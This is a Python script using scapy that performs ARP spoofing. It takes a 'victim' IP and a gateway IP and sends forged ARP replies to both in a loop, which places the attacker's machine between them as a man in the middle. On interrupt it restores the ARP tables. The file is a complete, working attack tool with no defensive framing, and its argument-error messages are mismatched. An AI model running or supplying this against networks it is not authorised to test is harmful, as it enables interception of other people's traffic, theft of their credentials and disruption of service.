#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IPv4 address of the victim")
    parser.add_option("-g", "--gateway", dest="gateway", help="IPv4 address of router")
    (options, _) = parser.parse_args()
    if not options.target:
        #code to handle error with Interface
        parser.error("[-] Please specify an interface, use --help for more info")
    elif not options.gateway:
        #code to handle error with MAC adress
        parser.error("[-] Please specify an MAC adress, use --help for more info")
    return options

def get_mac (ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    ans_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return (ans_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
        destination_mac = get_mac(dest_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)


options = get_arguments()
try:
    send_packets_count = 0
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        send_packets_count += 2
        print("\r[+] Packets sent: " +str(send_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected keyboard interrupt......Resetting ARP tables!")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
